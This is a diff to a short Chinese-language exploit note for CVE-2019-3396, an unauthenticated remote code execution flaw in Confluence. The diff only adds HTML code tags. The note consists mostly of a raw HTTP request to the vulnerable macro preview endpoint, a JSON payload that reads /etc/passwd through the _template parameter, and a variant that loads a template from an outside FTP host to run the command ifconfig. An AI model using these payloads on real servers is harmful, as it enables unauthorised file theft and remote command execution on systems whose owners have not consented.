@@ -1,6 +1,7 @@
 CVE-2019-3396
 Confluence 未授权 RCE (CVE-2019-3396) 漏洞
 
+<pre><code>
 POST /rest/tinymce/1/macro/preview HTTP/1.1
 Host: 10.10.20.181
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
@@ -13,6 +14,7 @@ Referer: http://10.10.20.181/
 Content-Length: 167
 X-Forwarded-For: 127.0.0.2
 Connection: keep-alive
+</code></pre>
 
 {"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}} 文件读取
 ftp://10.10.20.166:8886/r.vm","command":"ifconfig" 命令执行
